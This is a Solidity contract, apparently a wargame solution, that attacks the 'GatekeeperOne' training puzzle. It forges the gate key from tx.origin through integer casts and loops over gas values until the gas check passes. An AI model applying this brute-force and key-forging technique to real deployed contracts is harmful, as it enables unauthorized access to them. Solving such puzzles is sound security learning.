// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {GatekeeperOne} from "../../puzzles/13/GatekeeperOne.sol";

contract GatekeeperOneAttacker {
    GatekeeperOne internal puzzleContract;
    uint256 constant BASE_GAS = 21000;
    uint256 constant GAS_ITERATION = 8191;

    uint256 public iteration;

    constructor(address _puzzleContract) {
        puzzleContract = GatekeeperOne(_puzzleContract);
    }

    function attack() public {
        uint32 suffix = uint32(uint16(uint160(tx.origin)));
        uint64 prefix = uint64(type(uint32).max) + 1;
        bytes8 gateKey = bytes8(prefix + uint64(suffix));

        for (uint256 i = 0; i < GAS_ITERATION; i++) {
            try puzzleContract.enter{gas: BASE_GAS + i}(gateKey) {
                if(puzzleContract.entrant() == tx.origin) {
                    iteration = i;
                    return;
                }
            } catch {
                continue;
            }
        }
    }
}
